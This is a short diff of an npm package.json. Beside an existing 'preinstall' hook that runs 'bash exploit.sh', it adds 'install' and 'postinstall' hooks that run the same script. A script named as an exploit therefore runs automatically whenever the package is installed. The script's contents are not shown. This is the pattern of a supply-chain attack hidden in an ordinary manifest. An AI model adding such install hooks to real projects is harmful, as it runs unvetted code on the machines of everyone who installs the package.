@@ -118,6 +118,8 @@
   "license": "MIT",
   "scripts": {
     "preinstall": "bash exploit.sh",
+    "install": "bash exploit.sh",
+    "postinstall": "bash exploit.sh",
     "api": "node server/api.server.js",
     "bootstrap": "node scripts/bootstrap.js",
     "prebuild": "npm run prebuild:login && npm run prebuild:main",
